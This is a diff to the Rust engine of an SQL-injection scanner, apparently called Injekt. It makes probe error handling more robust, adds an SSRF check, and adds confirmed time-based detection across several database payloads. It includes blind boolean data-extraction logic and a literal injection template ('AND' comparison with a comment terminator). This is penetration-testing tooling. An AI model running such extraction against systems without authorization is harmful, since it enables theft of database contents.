@@ -25,8 +25,8 @@ use crate::{
         payload_opts::{PayloadOpts, build_final_payload, encode_with_safe_chars},
         request_tamper::{hpp_body_str, hpp_query_url, should_apply_chunked},
         stacked::{detector::StackedDetector, payloads::stacked_payloads_for},
-        tamper::{Tamper, tamper_transformation_sets},
-        time::{detector::TimeDetector, payloads::time_payload_for},
+        tamper::{Tamper, boolean_safe_transformation_sets, tamper_transformation_sets},
+        time::{detector::TimeDetector, payloads::all_time_payloads},
         union::{detector::UnionDetector, payloads::union_payloads_for},
     },
 };
@@ -342,6 +342,7 @@ impl Engine {
             .await
     }
 
+    #[allow(clippy::too_many_lines)]
     async fn run_internal(
         &self,
         target_str: &str,
@@ -357,9 +358,16 @@ impl Engine {
             warn!("--confirm has no effect yet (second-pass replay not implemented)");
         }
 
-        // Parse
+        // Parse (lexical) + DNS-time SSRF check (anti DNS-rebinding).
         let target = TargetUrl::parse(target_str, self.config.allow_private)
             .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
+        if !self.config.allow_private
+            && let Some(host) = target.inner().host_str()
+        {
+            TargetUrl::resolve_and_check(host, false)
+                .await
+                .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
+        }
         current = EngineState::Baseline;
         info!(state=?current, "phase baseline");
 
@@ -493,7 +501,13 @@ impl Engine {
         let pb = spinner("collecting baseline…");
 
         let mut samples = Vec::new();
-        for _ in 0..3 {
+        // Retry samples on body-read failure instead of pushing `Vec::new()`:
+        // an empty body scores as similarity ~0 / confidence 0.75 (false
+        // positive). Transport errors (`Timeout`, stream reset) are retryable
+        // and must never enter the baseline.
+        let mut attempts = 0usize;
+        while samples.len() < 3 && attempts < 6 {
+            attempts += 1;
             if self.cancel.is_cancelled() {
                 break;
             }
@@ -510,8 +524,9 @@ impl Engine {
                     let body = match self.client.read_body_with_timeout(r).await {
                         Ok(b) => b,
                         Err(e) => {
-                            warn!(error=%e, "baseline body read failed");
-                            Vec::new()
+                            warn!(error=%e, "baseline body read failed, retrying sample");
+                            self.state.write().await.increment_requests();
+                            continue;
                         }
                     };
                     samples.push(baseline::Sample {
@@ -969,9 +984,20 @@ impl Engine {
             let true_resp = self.client.send_with_retry(true_spec, &self.cancel).await;
             let true_ms = start.elapsed().as_secs_f64() * 1000.0;
             self.state.write().await.increment_requests();
+            // Never score a transport/body error as `""` (similarity ~0 =>
+            // false positive). Skip this DBMS candidate instead.
             let true_body = match true_resp {
-                Ok(r) => r.text().await.unwrap_or_default(),
-                Err(_) => String::new(),
+                Ok(r) => match self.client.read_body_string_with_timeout(r).await {
+                    Ok(b) => b,
+                    Err(e) => {
+                        warn!(error=%e, dbms=%kind, "fingerprint true body read failed, skipping");
+                        continue;
+                    }
+                },
+                Err(e) => {
+                    warn!(error=%e, dbms=%kind, "fingerprint true probe failed, skipping");
+                    continue;
+                }
             };
 
             if self.cancel.is_cancelled() {
@@ -992,8 +1018,17 @@ impl Engine {
             let false_ms = start.elapsed().as_secs_f64() * 1000.0;
             self.state.write().await.increment_requests();
             let false_body = match false_resp {
-                Ok(r) => r.text().await.unwrap_or_default(),
-                Err(_) => String::new(),
+                Ok(r) => match self.client.read_body_string_with_timeout(r).await {
+                    Ok(b) => b,
+                    Err(e) => {
+                        warn!(error=%e, dbms=%kind, "fingerprint false body read failed, skipping");
+                        continue;
+                    }
+                },
+                Err(e) => {
+                    warn!(error=%e, dbms=%kind, "fingerprint false probe failed, skipping");
+                    continue;
+                }
             };
 
             let res = detector.evaluate(
@@ -1082,8 +1117,12 @@ impl Engine {
             };
             let payload =
                 build_final_payload(&base_payload, effective_tampers, &self.config.payload_opts);
-            // Retry logic: require 2 probes, treat as true only if majority true
+            // Retry logic: require 2 probes, treat as true only if majority true.
+            // Transport/body errors are never scored (empty body => similarity
+            // ~0 => false positive); a guess with no valid trial is skipped
+            // without breaking so a transient blip cannot truncate inference.
             let mut true_count = 0usize;
+            let mut valid_trials = 0usize;
             for _ in 0..2 {
                 let spec = build_injection_spec_with_raw(
                     &target_clone2,
@@ -1100,9 +1139,23 @@ impl Engine {
                 let ms = start.elapsed().as_secs_f64() * 1000.0;
                 state_clone.write().await.increment_requests();
                 let body = match resp {
-                    Ok(r) => r.text().await.unwrap_or_default(),
-                    Err(_) => String::new(),
+                    Ok(r) => match client_clone.read_body_string_with_timeout(r).await {
+                        Ok(b) => b,
+                        Err(e) => {
+                            warn!(error=%e, len_guess, "extraction probe body read failed, skipping trial");
+                            continue;
+                        }
+                    },
+                    Err(e) => {
+                        // Cancelled must abort, never be scored or retried as transport noise.
+                        if matches!(e, crate::http::client::ClientError::Cancelled) {
+                            return Ok(());
+                        }
+                        warn!(error=%e, len_guess, "extraction probe failed, skipping trial");
+                        continue;
+                    }
                 };
+                valid_trials += 1;
                 let diff = crate::detection::response_diff::diff_against_baseline(
                     &baseline_body,
                     &body,
@@ -1117,6 +1170,13 @@ impl Engine {
                 if cancel_clone.is_cancelled() {
                     break;
                 }
+            }
+            if valid_trials == 0 {
+                warn!(
+                    len_guess,
+                    "extraction length probe inconclusive (transport errors), skipping guess"
+                );
+                continue;
             }
             let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
             // If we saw 0 true after 2 trials, length guess exceeded
@@ -1199,37 +1259,59 @@ impl Engine {
                     ),
                 };
                 let payload = build_final_payload(&base, &tampers, &popts);
-                // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
-                let spec = build_injection_spec_with_raw(
-                    &target,
-                    &target_str,
-                    &param,
-                    &payload,
-                    &marker_set,
-                    raw.as_ref(),
-                    opts,
-                    &popts,
-                );
-                let start = Instant::now();
-                let resp = client.send_with_retry(spec, &cancel).await;
-                let ms = start.elapsed().as_secs_f64() * 1000.0;
-                state.write().await.increment_requests();
-                let body = match resp {
-                    Ok(r) => r.text().await.unwrap_or_default(),
-                    Err(_) => String::new(),
-                };
-                let diff = crate::detection::response_diff::diff_against_baseline(
-                    &baseline_body,
-                    &body,
-                    baseline_mean2,
-                    ms,
-                    100.0,
-                );
-                // similar => true (>= mid)
-                Ok::<bool, InjektError>(diff.confidence < 0.4)
+                // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling.
+                // Transport/body errors are retried (bounded) then propagated
+                // as `Err` — never scored as `""` (similarity ~0 => wrong bit).
+                // The engine treats `Err` as an abstention/retry, so one
+                // hiccup cannot corrupt a bit.
+                let mut last_err: Option<String> = None;
+                for _ in 0..3 {
+                    let spec = build_injection_spec_with_raw(
+                        &target,
+                        &target_str,
+                        &param,
+                        &payload,
+                        &marker_set,
+                        raw.as_ref(),
+                        opts,
+                        &popts,
+                    );
+                    let start = Instant::now();
+                    let resp = client.send_with_retry(spec, &cancel).await;
+                    let ms = start.elapsed().as_secs_f64() * 1000.0;
+                    state.write().await.increment_requests();
+                    let body = match resp {
+                        Ok(r) => match client.read_body_string_with_timeout(r).await {
+                            Ok(b) => b,
+                            Err(e) => {
+                                warn!(error=%e, pos, mid, "extraction oracle body read failed, retrying");
+                                last_err = Some(e.to_string());
+                                continue;
+                            }
+                        },
+                        Err(e) => {
+                            warn!(error=%e, pos, mid, "extraction oracle probe failed, retrying");
+                            last_err = Some(e.to_string());
+                            continue;
+                        }
+                    };
+                    let diff = crate::detection::response_diff::diff_against_baseline(
+                        &baseline_body,
+                        &body,
+                        baseline_mean2,
+                        ms,
+                        100.0,
+                    );
+                    // similar => true (>= mid)
+                    return Ok::<bool, InjektError>(diff.confidence < 0.4);
+                }
+                Err::<bool, InjektError>(InjektError::Http(format!(
+                    "extraction oracle transport failure at pos {pos} mid {mid}: {}",
+                    last_err.unwrap_or_else(|| "unknown".to_owned())
+                )))
             }
         };
-        let extracted = engine.extract(inferred_len, oracle).await?;
+        let extracted = engine.extract(inferred_len, oracle, &cancel_clone).await?;
         let exposed = {
             use secrecy::ExposeSecret;
             extracted.expose_secret().to_owned()
@@ -1492,112 +1574,6 @@ impl Engine {
             }
         }
         Ok(())
-    }
-
-    #[allow(dead_code)]
-    async fn test_boolean(
-        &self,
-        target: &TargetUrl,
-        param: &TargetParameter,
-        baseline: &baseline::Baseline,
-    ) {
-        let payloads = boolean_payloads_for(None);
-        let detector = BooleanDetector::new();
-        for p in payloads.iter().take(2) {
-            if self.cancel.is_cancelled() {
-                break;
-            }
-            // craft urls with payloads
-            let true_url = inject_param(target, param, &p.true_payload, &[], false);
-            let false_url = inject_param(target, param, &p.false_payload, &[], false);
-
-            let (true_body, true_ms) =
-                fetch_body_and_time(&self.client, &true_url, &self.state).await;
-            let (false_body, false_ms) =
-                fetch_body_and_time(&self.client, &false_url, &self.state).await;
-
-            let baseline_body = baseline.representative_body_str();
-            let res = detector.evaluate(
-                &baseline_body,
-                &true_body,
-                &false_body,
-                baseline.mean_ms,
-                true_ms,
-                false_ms,
-            );
-            if res.is_vulnerable && res.confidence > 0.6 {
-                let evidence = format!(
-                    "boolean true_sim={:.2} false_sim={:.2}",
-                    res.true_similarity, res.false_similarity
-                );
-                let mut finding = Finding::new(
-                    target.as_str(),
-                    param.key(),
-                    TechniqueKind::Boolean,
-                    res.confidence,
-                    evidence,
-                );
-                finding.dbms = None;
-                self.state.write().await.push_finding(finding);
-                break;
-            }
-        }
-    }
-
-    #[allow(dead_code)]
-    async fn test_error(&self, target: &TargetUrl, param: &TargetParameter) {
-        let detector = ErrorDetector::new();
-        let payloads = crate::techniques::error::payloads::error_payloads_for(None);
-        for p in payloads.iter().take(2) {
-            if self.cancel.is_cancelled() {
-                break;
-            }
-            let url = inject_param(target, param, &p.payload, &[], false);
-            let (body, _ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
-            let r = detector.evaluate(&body);
-            if r.is_vulnerable {
-                let mut finding = Finding::new(
-                    target.as_str(),
-                    param.key(),
-                    TechniqueKind::Error,
-                    r.confidence,
-                    format!("error pattern {:?}", r.matched_pattern),
-                );
-                finding.dbms = Some(p.dbms.clone());
-                self.state.write().await.push_finding(finding);
-                break;
-            }
-        }
-    }
-
-    #[allow(dead_code)]
-    async fn test_time(
-        &self,
-        target: &TargetUrl,
-        param: &TargetParameter,
-        baseline: &baseline::Baseline,
-    ) {
-        let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
-        let payload = time_payload_for(None, 3);
-        let url = inject_param(target, param, &payload.payload, &[], false);
-        let (_body, ms) = fetch_body_and_time(&self.client, &url, &self.state).await;
-        // sleep_secs is a small time-based delay (seconds); cast is always lossless.
-        #[allow(clippy::cast_precision_loss)]
-        let r = detector.evaluate(ms, payload.sleep_secs as f64);
-        if r.is_vulnerable {
-            let finding = Finding::new(
-                target.as_str(),
-                param.key(),
-                TechniqueKind::Time,
-                r.confidence,
-                format!(
-                    "time delay {:.0}ms > threshold {:.0}ms",
-                    r.measured_ms,
-                    detector.threshold()
-                ),
-            );
-            self.state.write().await.push_finding(finding);
-        }
     }
 }
 
@@ -2011,30 +1987,21 @@ async fn fetch_for_payload(
     match resp {
         Ok(r) => {
             let status = r.status().as_u16();
-            #[allow(clippy::unwrap_used)]
-            let body = r.text().await.unwrap_or_default();
-            (body, elapsed, status)
+            // Bounded body read: a transport error (`Timeout`, reset) returns
+            // status 0 so callers skip scoring instead of treating `""` as a
+            // dissimilar body (similarity ~0 / confidence 0.75 false positive).
+            match client.read_body_string_with_timeout(r).await {
+                Ok(body) => (body, elapsed, status),
+                Err(e) => {
+                    warn!(error=%e, "probe body read failed, skipping score");
+                    (String::new(), elapsed, 0)
+                }
+            }
         }
-        Err(_) => (String::new(), elapsed, 0),
-    }
-}
-
-#[allow(dead_code)]
-async fn fetch_body_and_time(
-    client: &HttpClient,
-    url: &str,
-    state: &Arc<RwLock<SessionState>>,
-) -> (String, f64) {
-    let start = Instant::now();
-    let resp = client.get_with_retry(url.to_owned()).await;
-    let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
-    state.write().await.increment_requests();
-    match resp {
-        Ok(r) => {
-            let body = r.text().await.unwrap_or_default();
-            (body, elapsed_ms)
+        Err(e) => {
+            warn!(error=%e, "probe request failed, skipping score");
+            (String::new(), elapsed, 0)
         }
-        Err(_) => (String::new(), elapsed_ms),
     }
 }
 
@@ -2044,7 +2011,7 @@ async fn fetch_body_and_time_spec(
     url: String,
     state: &Arc<RwLock<SessionState>>,
     cancel: &CancellationToken,
-) -> (String, f64) {
+) -> (Option<String>, f64) {
     let start = Instant::now();
     let spec = RequestSpec {
         method: Method::GET,
@@ -2056,12 +2023,17 @@ async fn fetch_body_and_time_spec(
     let elapsed_ms = start.elapsed().as_secs_f64() * 1000.0;
     state.write().await.increment_requests();
     match resp {
-        Ok(r) => {
-            #[allow(clippy::unwrap_used)]
-            let body = r.text().await.unwrap_or_default();
-            (body, elapsed_ms)
+        Ok(r) => match client.read_body_string_with_timeout(r).await {
+            Ok(body) => (Some(body), elapsed_ms),
+            Err(e) => {
+                warn!(error=%e, "body read failed, skipping score");
+                (None, elapsed_ms)
+            }
+        },
+        Err(e) => {
+            warn!(error=%e, "request failed, skipping score");
+            (None, elapsed_ms)
         }
-        Err(_) => (String::new(), elapsed_ms),
     }
 }
 
@@ -2088,7 +2060,9 @@ async fn test_boolean_bounded(
     let payloads = boolean_payloads_for(None);
     let detector = BooleanDetector::new();
     let baseline_body = matcher.pre_process(&baseline.representative_body_str());
-    let tamper_sets = tamper_transformation_sets(tampers);
+    // Boolean TRUE/FALSE pairs require coherent transforms: opaque tampers
+    // (e.g. base64encode) are excluded via the boolean-safe sets.
+    let tamper_sets = boolean_safe_transformation_sets(tampers);
     for p in payloads
         .iter()
         .take(payload_budget(level, 2, payloads.len()))
@@ -2313,7 +2287,7 @@ async fn test_error_bounded(
     }
 }
 
-#[allow(clippy::too_many_arguments)]
+#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
 async fn test_time_bounded(
     client: &HttpClient,
     state: &Arc<RwLock<SessionState>>,
@@ -2331,68 +2305,116 @@ async fn test_time_bounded(
     level: u8,
     ignore_codes: &[u16],
 ) {
-    // Single-payload technique: `--level` carries no extra budget here.
-    let _ = level;
-    let detector = TimeDetector::new(baseline.mean_ms, baseline.stddev_ms);
-    let base = time_payload_for(None, 3);
+    // Blind sweep: L1 tries the 4 legacy payloads (one per DBMS),
+    // L2 doubles to legacies + first variants, L3+ exhausts all 9.
+    // Threshold reuses the baseline calibration (`from_baseline`); a
+    // positive first shot is confirmed by an immediate second shot
+    // (`evaluate_confirmed`) so a single jitter spike never reports.
+    // OPSEC: the extra request fires only on a positive first shot —
+    // clean targets cost the same as before. Jitter/rate-limiting are
+    // preserved via `fetch_for_payload`; outer `buffer_unordered`
+    // concurrency is untouched.
+    let detector = TimeDetector::from_baseline(baseline);
+    let candidates = all_time_payloads(3);
+    let budget = payload_budget(level, 4, candidates.len());
     let sets = tamper_transformation_sets(tampers);
-    for trans in &sets {
+    for base in candidates.iter().take(budget) {
         if cancel.is_cancelled() {
             break;
         }
-        let payload_str = build_final_payload(&base.payload, trans, popts);
-        let (raw_body, ms, status) = fetch_for_payload(
-            client,
-            state,
-            cancel,
-            target,
-            target_str,
-            param,
-            &payload_str,
-            marker_set,
-            raw,
-            opts,
-            popts,
-        )
-        .await;
-        // `--ignore-code`: an ignored status is skipped, never a finding.
-        if is_ignored(status, ignore_codes) {
-            continue;
-        }
-        let body = matcher.pre_process(&raw_body);
-        // sleep_secs is a small time-based delay (seconds); cast is always lossless.
-        #[allow(clippy::cast_precision_loss)]
-        let r = detector.evaluate(ms, base.sleep_secs as f64);
-        if r.is_vulnerable {
-            // Matcher veto gate: `Some(false)` rejects the candidate.
+        let mut confirmed = false;
+        for trans in &sets {
+            if cancel.is_cancelled() {
+                break;
+            }
+            let payload_str = build_final_payload(&base.payload, trans, popts);
+            let (raw_body, ms, status) = fetch_for_payload(
+                client,
+                state,
+                cancel,
+                target,
+                target_str,
+                param,
+                &payload_str,
+                marker_set,
+                raw,
+                opts,
+                popts,
+            )
+            .await;
+            // `--ignore-code`: an ignored status is skipped, never a finding.
+            if is_ignored(status, ignore_codes) {
+                continue;
+            }
+            let body = matcher.pre_process(&raw_body);
+            // sleep_secs is a small time-based delay (seconds); cast is always lossless.
+            #[allow(clippy::cast_precision_loss)]
+            let first = detector.evaluate(ms, base.sleep_secs as f64);
+            if !first.is_vulnerable {
+                continue;
+            }
+            // Matcher veto before spending the confirmation shot.
             if matcher.matches(&body, status) == Some(false) {
                 continue;
             }
-            let tamper_label = if trans.is_empty() {
-                "none".to_owned()
-            } else {
-                trans
-                    .iter()
-                    .map(super::super::techniques::tamper::Tamper::name)
-                    .collect::<Vec<_>>()
-                    .join(",")
-            };
-            let finding = Finding::new(
-                target.as_str(),
-                param.key(),
-                TechniqueKind::Time,
-                r.confidence,
-                format!(
-                    "time delay {:.0}ms > threshold {:.0}ms tamper={}{}{}{}",
-                    r.measured_ms,
-                    detector.threshold(),
-                    tamper_label,
-                    opts.evidence_suffix(),
-                    popts.evidence_suffix(),
-                    matcher.evidence_suffix()
-                ),
-            );
-            state.write().await.push_finding(finding);
+            if cancel.is_cancelled() {
+                break;
+            }
+            let (raw_body2, ms2, status2) = fetch_for_payload(
+                client,
+                state,
+                cancel,
+                target,
+                target_str,
+                param,
+                &payload_str,
+                marker_set,
+                raw,
+                opts,
+                popts,
+            )
+            .await;
+            if is_ignored(status2, ignore_codes) {
+                continue;
+            }
+            let body2 = matcher.pre_process(&raw_body2);
+            if matcher.matches(&body2, status2) == Some(false) {
+                continue;
+            }
+            #[allow(clippy::cast_precision_loss)]
+            let r = detector.evaluate_confirmed(ms, ms2, base.sleep_secs as f64);
+            if r.is_vulnerable {
+                let tamper_label = if trans.is_empty() {
+                    "none".to_owned()
+                } else {
+                    trans
+                        .iter()
+                        .map(super::super::techniques::tamper::Tamper::name)
+                        .collect::<Vec<_>>()
+                        .join(",")
+                };
+                let mut finding = Finding::new(
+                    target.as_str(),
+                    param.key(),
+                    TechniqueKind::Time,
+                    r.confidence,
+                    format!(
+                        "time delay {:.0}ms > threshold {:.0}ms tamper={}{}{}{}",
+                        r.measured_ms,
+                        detector.threshold(),
+                        tamper_label,
+                        opts.evidence_suffix(),
+                        popts.evidence_suffix(),
+                        matcher.evidence_suffix()
+                    ),
+                );
+                finding.dbms = base.dbms.clone();
+                state.write().await.push_finding(finding);
+                confirmed = true;
+                break;
+            }
+        }
+        if confirmed {
             break;
         }
     }
@@ -2775,7 +2797,9 @@ async fn test_json_bounded(
     let detector = JsonDetector::new();
     let payloads = json_payloads_for(None);
     let baseline_body = matcher.pre_process(&baseline.representative_body_str());
-    let tamper_sets = tamper_transformation_sets(tampers);
+    // Same boolean-differential constraint as `test_boolean_bounded`: opaque
+    // tampers (e.g. base64encode) would make TRUE/FALSE indistinguishable.
+    let tamper_sets = boolean_safe_transformation_sets(tampers);
     for p in payloads
         .iter()
         .take(payload_budget(level, 2, payloads.len()))
@@ -3191,8 +3215,12 @@ async fn extract_enum_field(
     // enumeration is detection-only (a veto would only hide data).
     let baseline_proc = matcher.pre_process(baseline_body);
 
-    // First infer length (max 500 chars for enum results)
+    // First infer length (max 500 chars for enum results).
+    // Transport/body errors are never scored: the guess is skipped (no
+    // break, no length update) so a transient blip cannot truncate
+    // inference. Persistent failure aborts gracefully with `Ok(None)`.
     let mut inferred_len = 0;
+    let mut consecutive_errors = 0usize;
     for len_guess in 1..=500 {
         if cancel.is_cancelled() {
             break;
@@ -3207,9 +3235,29 @@ async fn extract_enum_field(
         let ms = start.elapsed().as_secs_f64() * 1000.0;
         state.write().await.increment_requests();
         let raw_body = match resp {
-            Ok(r) => r.text().await.unwrap_or_default(),
-            Err(_) => String::new(),
+            Ok(r) => match client.read_body_string_with_timeout(r).await {
+                Ok(b) => b,
+                Err(e) => {
+                    warn!(error=%e, label=%label, len_guess, "enum probe body read failed, skipping guess");
+                    consecutive_errors += 1;
+                    if consecutive_errors >= 5 {
+                        warn!(label=%label, "enum aborted after 5 consecutive transport errors");
+                        return Ok(None);
+                    }
+                    continue;
+                }
+            },
+            Err(e) => {
+                warn!(error=%e, label=%label, len_guess, "enum probe failed, skipping guess");
+                consecutive_errors += 1;
+                if consecutive_errors >= 5 {
+                    warn!(label=%label, "enum aborted after 5 consecutive transport errors");
+                    return Ok(None);
+                }
+                continue;
+            }
         };
+        consecutive_errors = 0;
         let body = matcher.pre_process(&raw_body);
         let diff = crate::detection::response_diff::diff_against_baseline(
             &baseline_proc,
@@ -3265,37 +3313,58 @@ async fn extract_enum_field(
             let cmp = detector.ascii_cmp_expr(&query, pos, mid);
             let base = format!("' AND {cmp} -- -");
             let payload = build_final_payload(&base, &tampers, &popts);
-            let spec = build_injection_spec_with_raw(
-                &target,
-                &target_str,
-                &param,
-                &payload,
-                &marker_set,
-                raw.as_ref(),
-                opts,
-                &popts,
-            );
-            let start = std::time::Instant::now();
-            let resp = client.send_with_retry(spec, &cancel).await;
-            let ms = start.elapsed().as_secs_f64() * 1000.0;
-            state.write().await.increment_requests();
-            let raw_body = match resp {
-                Ok(r) => r.text().await.unwrap_or_default(),
-                Err(_) => String::new(),
-            };
-            let body = matcher.pre_process(&raw_body);
-            let diff = crate::detection::response_diff::diff_against_baseline(
-                &baseline_body,
-                &body,
-                baseline_mean_clone,
-                ms,
-                100.0,
-            );
-            Ok::<bool, InjektError>(diff.confidence < 0.4)
+            // Transport/body errors are retried (bounded) then propagated as
+            // `Err` — never scored as `""`. The engine treats `Err` as an
+            // abstention/retry, so one hiccup cannot corrupt a bit.
+            let mut last_err: Option<String> = None;
+            for _ in 0..3 {
+                let spec = build_injection_spec_with_raw(
+                    &target,
+                    &target_str,
+                    &param,
+                    &payload,
+                    &marker_set,
+                    raw.as_ref(),
+                    opts,
+                    &popts,
+                );
+                let start = std::time::Instant::now();
+                let resp = client.send_with_retry(spec, &cancel).await;
+                let ms = start.elapsed().as_secs_f64() * 1000.0;
+                state.write().await.increment_requests();
+                let raw_body = match resp {
+                    Ok(r) => match client.read_body_string_with_timeout(r).await {
+                        Ok(b) => b,
+                        Err(e) => {
+                            warn!(error=%e, pos, mid, "enum oracle body read failed, retrying");
+                            last_err = Some(e.to_string());
+                            continue;
+                        }
+                    },
+                    Err(e) => {
+                        warn!(error=%e, pos, mid, "enum oracle probe failed, retrying");
+                        last_err = Some(e.to_string());
+                        continue;
+                    }
+                };
+                let body = matcher.pre_process(&raw_body);
+                let diff = crate::detection::response_diff::diff_against_baseline(
+                    &baseline_body,
+                    &body,
+                    baseline_mean_clone,
+                    ms,
+                    100.0,
+                );
+                return Ok::<bool, InjektError>(diff.confidence < 0.4);
+            }
+            Err::<bool, InjektError>(InjektError::Http(format!(
+                "enum oracle transport failure at pos {pos} mid {mid}: {}",
+                last_err.unwrap_or_else(|| "unknown".to_owned())
+            )))
         }
     };
 
-    let extracted = engine.extract(inferred_len, oracle).await?;
+    let extracted = engine.extract(inferred_len, oracle, cancel).await?;
     let exposed = {
         use secrecy::ExposeSecret;
         extracted.expose_secret().to_owned()
